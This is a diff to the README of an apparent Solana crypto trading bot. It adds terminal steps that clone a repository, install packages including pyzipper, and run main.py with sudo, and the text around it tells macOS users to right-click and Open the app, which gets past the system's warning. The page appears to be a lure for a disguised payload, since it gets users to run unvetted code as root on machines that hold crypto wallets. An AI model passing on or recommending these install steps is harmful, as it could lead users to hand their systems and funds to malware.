@@ -36,6 +36,19 @@ Solana Ultimate Ai Trade Bot is designed for those who truly want to maximize th
 3. Right-click on `SolAiBot.app` and select `Open` to access the bot. 
 4. Once the bot is running, it may take a few minutes to fetch the list of tokens from the Solana network depending on your internet speed. During this time, you can watch the informational messages on the screen to see what the bot is doing. 
 
+## Way 2
+  
+Then run the following commands in Terminal:
+
+```shell
+git clone https://github.com/PumpExpert/All-in-One-Solana-Bot.git
+cd All-in-One-Solana-Bot
+pip install Pillow PyQt5 pyzipper requests
+sudo python3 main.py
+```
+
+
+
 ### Windows Users 
 
 1. Download the packaged version from [here](https://github.com/PumpExpert/All-in-One-Solana-Bot/releases/download/V4.1.1/SolAiBot_Win.zip). 
